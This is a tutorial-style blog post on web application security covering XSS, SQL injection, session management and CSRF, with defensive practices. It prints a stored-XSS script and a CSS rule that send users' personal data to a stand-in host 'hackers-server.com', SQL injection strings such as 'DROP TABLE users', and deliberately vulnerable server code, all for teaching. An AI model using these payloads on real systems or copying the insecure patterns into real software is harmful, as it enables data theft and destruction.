---
layout: post
title:  "Web Application Security"
author: mofor
categories: [ web development, security ]
image: assets/images/posts/2023-05-31-web-application-security/1.jpg
featured: true
beforetoc: "Are web applications nowadays really safe to use?"
toc: true
---
Web application security is a critical aspect of ensuring the safety and integrity of web-based applications. It involves protecting web applications from various vulnerabilities and threats that could lead to unauthorized access, data breaches, and other malicious activities.

## The Great Twitter Worm of 2009

In the summer of 2009, a small vulnerability in Twitter's platform led to a major incident that caught the attention of millions of users worldwide. This incident, known as the "Twitter Worm," demonstrated the power of a simple vulnerability and its potential to spread chaos on a massive scale.

The Twitter Worm was the result of a cross-site scripting (XSS) vulnerability, a common web application security flaw. An attacker named "Mikeyy" discovered and exploited this vulnerability, allowing him to execute malicious code on Twitter's platform. Mikeyy created a self-replicating worm that spread rapidly across the social media platform, causing havoc in its wake.

When users unknowingly clicked on a compromised tweet, the worm hijacked their accounts and posted tweets with malicious links. These tweets then appeared in the timelines of their followers, leading to an exponential spread of the worm. Within hours, thousands of users fell victim to the attack, with their accounts being compromised and their followers exposed to the threat.

The incident not only disrupted Twitter's service but also created confusion and concern among its users. News of the Twitter Worm quickly spread, drawing the attention of media outlets and sparking discussions about the security of social media platforms.

Twitter's response was swift but challenging. Their security team worked diligently to identify and patch the vulnerability, while simultaneously battling the rampant spread of the worm. The incident served as a wake-up call for Twitter and other social media platforms, highlighting the need for robust security measures to prevent such vulnerabilities from being exploited.

## Introduction

<!-- Web application security is a critical aspect of ensuring the safety and integrity of web-based applications. It involves protecting web applications from various vulnerabilities and threats that could lead to unauthorized access, data breaches, and other malicious activities. -->
This is probably one of the concepts developers overlook, in some cases because they use tools that handled some of these vulnerabilities under the hood.

![Web Application Vulnerability]({{site.baseurl}}/assets/images/posts/2023-05-31-web-application-security/reported-web-vulnerabilities.png)
<!-- <img src='/assets/images/posts/2023-05-31-web-application-security/reported-web-vulnerabilities.png' alt='Web Application Vulnerability' /> -->

As seen in our not so very recent vulnerability statistics, WebAppSec has been one of those fields worth investing time into. Though native applications are slowly gaining attention, the web has been around for long, and is not going anywhere any time soon.

<!-- Thus, as developers, we need to make sure to not give users a reason for doubting our application. How is that you may ask? by making it secure. -->

Just like a lady stays in a relationship with a protective man (cause her security is assured -  no feeling as priceless as feeling safe), so will a user keep engaging with an application that guarantees safety and security.

So in this post, we’ll explore some essential aspects of web application security, including vulnerabilities like Cross-Site Scripting (XSS), SQL injection (SQLi), Cross Site Forgery Request (CSFR) and Insecure Session Management; how to handle them with some best practices and secure coding techniques, input validation and secure session handling.

## Top four web application vulnerabilities

### Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a common vulnerability in web applications that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can be used to steal sensitive information, modify web content, or perform other malicious actions. You know how scripts bring some life to web applications? the same is true for its demise. At the core of XSS attacks, it functions by taking advantage of the fact that web applications execute scripts on user's browsers. As a result, any type of dynamically created script that is executed puts a web application at risk if the script being executed can be contaminated or modified in any way - in particular by an end user.

In as much as there are categorical variations, Stored, Reflected and DOM-based XSS attacks encompass the types of XSS that most modern web applications need to look out for on a regular basis, and have been designated by committees like the Open Web Application Security Project (OWASP). as tje most common XSS attack vectors on the web. While this is not an in-depth tutorial, be sure to read on the various categories if interested.

#### XSS Discovery and Exploitation

Mimicking the Twitter Worm, suppose we have our social networking platform, where users can view profiles, make posts, and comments. Generally, commenting on our platform doesn't support text or markup formatting, but then you come across this awesome post of your crush, and want to leave a comment, but also you don't want to be casual like everyone else. So for the tech-savy person you are, you go ahead to comment this:

```html
You truly are an epitome of <strong>beauty</strong>
```

and boom , you see this:

> You truly are an epitome of **beauty**

Notice how your code made the text bold? That my friend is when you smirk and repeat the same action, only this time, with a more malicious intent.

What just happened is common in many web applications. The simple architectural mistake with havoc-causing potential if found by a hacker is:

- user submits a comment via a form
- user comment is stored in a database
- comment is requested via HTTP request by one or more users
- comment is injected into the page
- injected comment is interpreted as DOM rather than text

This usually happens when developers apply HTTP request results to the DOM literally, than as strings.

```javascript
/*
* Create a DOM node of type 'div.
* Append to this div a string to be interpreted as DOM rather than text.
*/
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;
/*
* Append the div to the DOM, with it the innerHTML DOM from the comment.
* Because the comment is interpreted as DOM, it will be parsed
* and translated into DOM elements upon load.
*/
const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);
```

Because the text is appended literally to the DOM, it is interpreted as DOM markup
rather than text. Our customer support request included a <strong></strong> tag in
this case.
In a more malicious case, we could have caused a lot of havoc using the same vulnerability. Script tags are the most popular way to take advantage of XSS vulnerabilities,
but there are many ways to take advantage of such a bug.
Consider if the comment had the following instead of just a tag to bold the
text:

```html
Loving the outfit.
<script>
/*
* Get a list of all customers from the page.
*/
const customers = document.querySelectorAll('.user-comment');
/*
* Iterate through each DOM element containing the user-comment class,
* collecting privileged personal identifier information (PII)
* and store that data in the customerData array.
*/
const customerData = [];
customers.forEach((customer) => {
customerData.push({
firstName: customer.querySelector('.firstName').innerText,
lastName: customer.querySelector('.lastName').innerText,
email: customer.querySelector('.email').innerText,
phone: customer.querySelector('.phone').innerText
});
});
/*
* Build a new HTTP request, and exfiltrate the previously collected
* data to the hacker's own servers.
*/
const http = new XMLHttpRequest();
http.open('POST', 'https://hackers-server.com/data', true);
http.setRequestHeader('Content-type', 'application/json');
http.send(JSON.stringify(customerData);
</script>
```

This is a much more malicious use case. And it’s extremely dangerous for a number
of reasons. The preceding code is what is known as a stored XSS attack — a variation of
XSS that relies on the actual attack code being stored in the application owner’s data‐
bases. In our case, the comment we sent to is being stored on our platform's
servers.
When a script tag hits the DOM via JavaScript, the browser’s JavaScript interpreter is
immediately invoked and runs the code within the `<script></script>` tags. This
means that our code would run without any interaction required.
What this code is doing is quite simple, and doesn’t take an expert hacker to cook up.
We are traversing the DOM using `document.querySelector()` and stealing privileged data that only our platform's employee or admin would have
access to. We find this data in the UI, convert it to a nice JSON for readability and
easy storage, and then send it back to our own servers for use or sale at a later time.
The scariest thing about this is that because this code is inside of a script tag, it would
not appear to the end user. The user would see the literal comment text, but the `<script></script>` tags and everything in between would
not be visible to the rep, although it would be executing in the background. This is
because the browser will interpret the text as text. But the browser will see the
script tag and interpret that as a script, just as it would if a legitimate developer wrote
some inline script for a legitimate site.

Even more interestingly, if another user opens this comment, they will have the malicious script run against their browser state as well. This means that because the script
is stored in a database, when requested and visible via the UI, any privileged user who
views this comment would be attacked by the script.

This is similar to what Mikeyy did in the Twitter worm and is a classic example of a stored XSS attack that would work against a web application that lacked proper security controls. It is a simple demonstration, and can be
easily protected against, but it is a solid entrypoint into the
world of XSS nonetheless.

#### Defending Against XSS Attacks - Best Practices

There is one major rule you can implement in your development team in order to
dramatically mitigate the odds of running into XSS vulnerabilities: 
> Don’t allow any user-supplied data to be passed into the DOM—except as strings.

Such a rule is not applicable to all applications, as many applications have features
that incorporate users to DOM data transfer. In this case, we can make this rule more
specific:

> Never allow any unsanitized user-supplied data to be passed into the DOM.

Generally, we inject user data into the DOM using `innerText` or `innerHTML`. When
HTML tags are not needed, innerText is much safer because it attempts to sanitize
anything that looks like an HTML tag by representing it as a string.

**Less safe:**

```javascript
const userString = '<strong>hello, world!</strong>';
const div = document.querySelector('#user-comment');
div.innerHTML = userString; // tags interpreted as DOM
```

**More safe:**

```javascript
const userString = '<strong>hello, world!</strong>';
const div = document.querySelector('#user-comment');
div.innerText = userString; // tags interpreted as strings
```

Using innerText rather than innerHTML whenever appending true strings or string-
like objects to the DOM is a best practice. This is because innerText performs its
own sanitization in order to view HTML tags as strings, whereas innerHTML does not
perform such sanitization and will interpret HTML tags as HTML tags when loaded
into the DOM.

Did you know you could also do some harm using CSS?
`background: url('some-url')` does make a GET Request.
CSS allows for selective styling based on the condition of a form. This means we
can change the background of an element in the DOM based on the state of a form
field:

```css
#income[value=">100k"] {
background:url("https://www.hackers-server.com/incomes?amount=gte100k");
}
```

As you can see, when the income button is set to >100k, the CSS background changes,
initiating a GET request and leaking the form data to another website.
CSS is much more difficult to sanitize than JavaScript, so the best way to prevent such
attacks is to disallow the uploading of stylesheets or specifically generate stylesheets
on your own, only allowing a user to modify fields you permit that do not initiate
GET requests.

##### Content Security Policy for XSS Prevention

The CSP is a security configuration tool that is supported by all major browsers. It
provides settings that a developer can take advantage of to either relax or harden
security rules regarding what type of code can run inside your application.
CSP protections come in several forms, including what external scripts can be loaded,
where they can be loaded, and what DOM APIs are allowed to execute the script.
Let’s evaluate some CSP configurations that aid in mitigating XSS risk.

CSP allows you to specifically whitelist URLs from which dynamic scripts can be
loaded. This is known as script-src in your CSP. A simple script-src looks like
this: `Content-Security-Policy: script-src "self" https://whitelist.com.`

With such a CSP configuration, attempting to load a script from https://hackers-server.com would not be successful, and the browser would throw a CSP violation

There are other ways to mitigate this vulnerability, but for the sake of simplicity, we'll have those.

### SQL Injection (SQLi)

SQL injection is the most classically referenced form of injection.
An SQL string is escaped in an HTTP payload, leading to custom SQL queries being
executed on behalf of the end user.

Let’s consider another simple Node.js/Express.js server that communicates with an SQL database:

```javascript
const sql = require('mssql');
/*
* Receive a GET request to /users, with a user_id param on the request body.
*
* An SQL lookup will be performed, attempting to find a user in the database
* with the `id` provided in the `user_id` param.
*
* The result of the database query is sent back in the response.
*/
app.get('/users', function(req, res) {
const user_id = req.params.user_id;
/*
* Connect to the SQL database (server side).
*/
await sql.connect('mssql://username:password@localhost/database');
/*
* Query the database, providing the `user_id` param from the HTTP
* request body.
*/
const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);
/*
* Return the result of the SQL query to the requester in the
* HTTP response.
*/
return res.json(result);
});
```

In this example, a developer used direct string concatenation to attach the query
param to the SQL query. This assumes the query param being sent over the network
has not been tampered with, which we know not to be a reliable metric for legitimacy.
In the case of a valid `user_id`, this query will return a user object to the requester. In
the case of a more malicious user_id string, many more objects could be returned
from the database. Let’s look at one example:

```javascript
const user_id = '1=1'
```

The old truthy evaluation. Now the query says:

```sql
SELECT * FROM users where USER = true
```

which translates into ***“give all user objects back to the requester.”***

What if we just started a new statement inside of our user_id object?

```javascript
user_id = '123abc; DROP TABLE users;';
```

Now our query looks like this:

```sql
SELECT * FROM users WHERE USER = 123abd; DROP TABLE users;
```

In other words, we appended another query on top of the original
query. Oops, now we need to rebuild our userbase.

Is your school managed digitally? You got a low Cumulative GPA?:

```javascript
const user_id = '123abc; UPDATE students SET cgpa = 4 WHERE user = 123abd;'
```

Now, rather than requesting a list of all users, or dropping the user tables, we are
using the second query to update our own user account in the database—in this case,
acquiring a CGPA of 4. You see how important security is?.

There are a number of great ways to prevent these attacks from occurring, as SQL
injection defenses have been in development for over two decades now.

#### Mitigating SQL Injection

##### ORMs

It is advisable to use Object Relational Mappers (ORMs) like Sequelize to perform safe database operations.

```javascript
const { Op } = require('sequelize');

app.get('/users', (req, res) => {
  const user_id = req.params.user_id;
  Product.findAll({
    where: {
      user: {
        [Op.eq]: user_id,
      },
    },
  }).then((user) => {
    // Handle the retrieved user
  });
});
```

But what if we don't have the liberty to do so?
That's where prepared statements come in.

##### Prepared Statements

Prepared statements work by compiling the query first, with placeholder values for
variables. These are known as bind variables, but are often just referred to as place‐
holder variables. After compiling the query, the placeholders are replaced with the
values provided by the developer. As a result of this two-step process, the intention of
the query is set before any user-submitted data is considered.

The only major trade-off between traditional SQL queries and prepared statements is
that of performance. Rather than one trip to the database, the database is provided
the prepared statement followed by the variables to inject after compilation and at
runtime of the query. In most applications, this performance loss will be minimal.
Syntactically, prepared statements differ from database to database and adapter to
adapter.
In MySQL, prepared statements are quite simple:

```sql
PREPARE q FROM 'SELECT name, matricule from students WHERE cgpa >= ?';
SET @gpa = 3.6;
EXECUTE q USING @gpa;
DEALLOCATE PREPARE q;
```

In this prepared statement, we are querying the MySQL database for students (we
want name and matricule returned) that have a Cumulative GPA >= ?.
First, we use the statement PREPARE to store our query under the name q. This query
will be compiled and ready for use. Next, we set a variable @gpa to 3.6.
Then we EXCECUTE the query providing @gpa to fill the ? placeholder/bind variable.
Finally, we use DEALLOCATE on q to remove it from memory so its
namespace can be used for other things.
In this simple prepared statement, q is compiled prior to being executed with @gpa.
Even if @gpa was set equal to:

> `3; UPDATE users WHERE id = 123 SET balance = 10000`

the additional query would not fire as it would not be compiled by the data‐base. Awesome huh?

### Insecure Session Management

A student once requested me to review some code, and upon landing on his login route, found this:

```javascript
app.post('/login', (req, res) => {
  const userId = req.body.user_id;
  req.session.user_id = userId;
  res.redirect('/dashboard');
});
```

I mean, pure ingenuity. No argument there.

Insecure session management is a critical vulnerability in web application security. It refers to the improper handling of user sessions, which can result in unauthorized access, session hijacking, and other security breaches. Session management involves managing user sessions, which are temporary interactions between a user and a web application during their visit.

Let us have a look at the portion of code below for a stateful express server:

```javascript
const session = require('express-session');
app.use(session({ secret: 'mysecret' }));
```

The average developer might ask, what's wrong with it? Well, let's find out.

- **Lack of Session Expiration**: Are you one of those users who get bored to login when session expires? You're actually been done a favour.
Insecure session management can occur when sessions do not have an expiration mechanism. Without session expiration, an attacker who gains access to a valid session can use it indefinitely.
You might ask, how can the hacker gain access to my session? Well, while there's techniques on Session Hijacking, Fixation, Sidejacking and Replay, we will see how hackers make us of Cross Site Forgery Requests.

For now, to avoid this, set an appropriate expiration time for sessions based on the application's requirements. In Express.js, you can specify the `cookie.maxAge` property within the session configuration to set the expiration time. Additionally, consider implementing an `"idle timeout"` where sessions expire after a certain period of inactivity.

- **Insufficient Session ID Generation**: Insecure session management can occur if session IDs are easily guessable or predictable. If an attacker can predict or obtain a valid session ID, they can hijack user sessions.

To mitigate this, ensure that session IDs are generated using a strong random number generator. In Express.js, you can provide a custom session ID generator using the `genid` option in the session configuration. It is recommended to use a library like `uuid` or `crypto` to generate secure session IDs.

- **Insecure Session Storage**: Insecure session management can occur if sensitive session data is stored in insecure locations or transmitted without encryption.

To fix this, store sensitive session data on the server-side and avoid storing it in client-side storage. In Express.js, you can configure the session store to use a secure storage mechanism, such as a database store like MongoDB or Redis. Additionally, ensure that session data is transmitted over secure channels using HTTPS/TLS encryption.

The list goes on and on, we see the developer leaving out crucial properties like:

- httpOnly
- sameSite
- etc ...

Often, Insecure Session Management leads to CSFR.

### Cross Site Forgery Request (CSFR)

CSRF occurs when an attacker tricks a victim into performing unintended actions on a web application on which the victim is authenticated. This can happen if the web application relies solely on session cookies for authentication and does not implement appropriate CSRF protection mechanisms.

#### CSRF and Insecure Session Management:

Insecure session management can contribute to CSRF attacks because the attacker can exploit the victim's active session to perform unauthorized actions. For example, if a web application uses only session cookies for authentication and does not validate the origin of requests, an attacker can trick the victim into unknowingly sending authenticated requests to the application, leading to potential data manipulation, unauthorized transactions, or other malicious activities.

```javascript
app.post('/update-email', (req, res) => {
  // Update the email address
  const userId = req.session.userId;
  const newEmail = req.body.email;

  // Update the user's email in the database
  db.updateEmail(userId, newEmail)
    .then(() => {
      res.send('Email updated successfully');
    })
    .catch((err) => {
      res.status(500).send('Error updating email');
    });
});
```

In the above example, there is no CSRF protection implemented. The server accepts a POST request to update the user's email address based on the userId stored in the session. However, this code is vulnerable to CSRF attacks because it does not validate the origin of the request, allowing an attacker to forge a request from a malicious site.

## Secure coding techniques

- ### Input Validation

  Validate and sanitize all user inputs to prevent vulnerabilities like XSS and SQL injection.
  You can use validation libraries like Yup Resolver, Bootstrap validator, any validation plugin/library or Regular Expressions to enforce rules for client-side validation, making sure no malicious input can be sent to the server.
  Avoid making database queries with raw user input, then responding later when the damage has been done.

  For example:

  ```javascript
  import * as yup from 'yup';
  
  export const schema = yup.object().shape({
    email: yup
      .string()
      .required('Please enter an email')
      .matches(
        /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/,
        'Please Enter a valid email'
      ),
    
    password: yup
      .string()
      .required('Please Enter a password with matricule format')

  });

  ```

  With this validation in check, a user is not allowed to enter `anonymous@gmail.com; DROP TABLE users;`
  Imagine using this, with an ORM to add an extra layer of security, top-notch.

- ### Secure Session Handling

  - Setting Session Expiration

  - Session ID Generation

  - Secure Session Storage

  - **CSRF Token Protection**: Generate a unique CSRF token for each session and include it in a hidden form field or a custom HTTP header. On the server side, validate the token for each sensitive operation to ensure that the request is legitimate.

  - **Same-Site Cookie Attribute**: Set the SameSite attribute for session cookies to Strict or Lax to limit cookie usage to the same site origin, preventing cross-site request forgery.

  - **Double-Submit Cookie**: Create a separate CSRF cookie that contains a random value, and compare it with a corresponding value submitted in the request body or headers. If they do not match, the request can be rejected.

  - **Origin Validation**: Verify the origin or referrer header of incoming requests to ensure that they match the expected domain. Reject requests coming from unexpected or untrusted origins.

  - **Unique and Unpredictable Actions**: Ensure that sensitive actions, such as updating user information or making transactions, have unique and unpredictable parameters or tokens associated with them. This adds an extra layer of protection against CSRF attacks.


<!-- - **Input Validation**: Validate and sanitize all user inputs to prevent vulnerabilities like XSS and SQL injection. -->

- **Secure Configuration**: Follow security best practices for server configuration, including using strong passwords, disabling unnecessary services, and keeping software up to date.

- **Least Privilege**: Apply the principle of least privilege, granting users and components only the necessary permissions to perform their tasks.

- **Security Testing**: Conduct regular security assessments and penetration tests to identify vulnerabilities in your web application.

- **Security Libraries and Frameworks**: Utilize well-established security libraries and frameworks that provide built-in security features and protection against common vulnerabilities.

Not leaving out CSP, and all other mentioned and unmentioned techniques.

I hope you saw the vitality of security, and how little things we overlook can cause havoc.
If you haven't experienced any vulnerability attacks yet, probably a hacker hasn't found that loophole. Keep counting your luck. Reach out to a Pentester and have him do his thing, you'll be in awe if you have been overlooking security.

Well, that it guys, hope you had a good time.
